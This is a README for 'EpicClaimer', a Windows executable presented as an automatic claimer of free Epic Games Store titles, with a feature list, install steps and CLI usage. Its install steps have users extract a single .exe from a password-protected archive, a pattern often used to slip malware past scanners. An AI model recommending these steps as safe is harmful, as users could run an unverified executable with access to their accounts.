<img width="1280" height="720" alt="image" src="https://github.com/user-attachments/assets/3ebaa6fe-cb70-4028-b2c7-4e781c58a7d8" />

# EpicClaimer
Automated weekly free-game claimer for Epic Games Store — headless CLI scheduler that logs in via Epic's official OAuth, claims every current promotion, and keeps a clean claim history.
# EpicClaimer — Epic Games Free Game Auto-Claimer

**Automated weekly free-game claimer for the Epic Games Store.** Logs in through Epic's official OAuth device flow, detects every active promotion, and claims each title automatically on schedule — with a full claim history and zero manual clicks.

![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-blue)
![Epic](https://img.shields.io/badge/integration-Epic%20Games%20Store-313131)
![Status](https://img.shields.io/badge/status-stable-brightgreen)
![License](https://img.shields.io/badge/license-MIT-lightgrey)

---

## Overview

EpicClaimer talks directly to the Epic Games Store public catalog and OAuth endpoints to enumerate current giveaways, then claims them against your account on a schedule. No browser, no third-party backend, no scraping — everything is done via the same endpoints the official launcher uses.

## Key Features

- **Automatic weekly claims** — detects every active free promotion and claims it on schedule.
- **Official OAuth login** — device-code flow, no password ever stored.
- **Headless / scheduler mode** — runs as a background task via Windows Task Scheduler.
- **Claim history & receipts** — timestamped log of every title claimed, with order IDs.
- **Multi-account profiles** — isolated session vaults for more than one Epic account.
- **Notifications** — optional desktop toast and webhook on each successful claim.
- **Portable** — single `.exe`, no installer, no registry writes.

## Installation

1. Download `EpicClaimer-v1.0.0.zip` from the [Releases](../../releases/latest) section.
2. Extract with password: `8025381933`.
3. Run `EpicClaimer.exe`.
4. Follow the OAuth device-code prompt to link your Epic account.
5. Enable the weekly schedule — done.

## System Requirements

| Component | Requirement |
|---|---|
| OS | Windows 10 / 11 (x64) |
| Runtime | .NET 8 Desktop Runtime |
| Network | HTTPS outbound to `*.epicgames.com` |
| Privileges | Standard user |

## Usage

```bash
EpicClaimer.exe login          # link an Epic account via OAuth
EpicClaimer.exe claim          # claim all current free promotions
EpicClaimer.exe schedule on    # register weekly task
EpicClaimer.exe history        # show claim receipts
EpicClaimer.exe logout         # wipe stored session
